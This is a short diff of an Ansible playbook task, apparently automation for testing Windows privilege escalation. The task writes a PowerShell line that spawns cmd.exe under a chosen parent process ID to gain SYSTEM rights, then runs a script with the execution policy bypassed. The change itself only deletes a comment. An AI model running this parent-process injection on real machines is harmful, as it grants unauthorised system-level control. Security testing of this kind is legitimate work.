@@ -19,6 +19,5 @@
     - name: Inject and check if running as system
       win_shell: |
         echo '[MyProcess]::CreateProcessFromParent({{pid}} ,"cmd.exe")' > c:\temp\priv-temp.ps1
-      #remove carriage return
         (Get-Content .\priv.ps1) -join ' ' > priv.ps1
         powershell.exe -ExecutionPolicy Bypass -Command c:\temp\priv.ps1
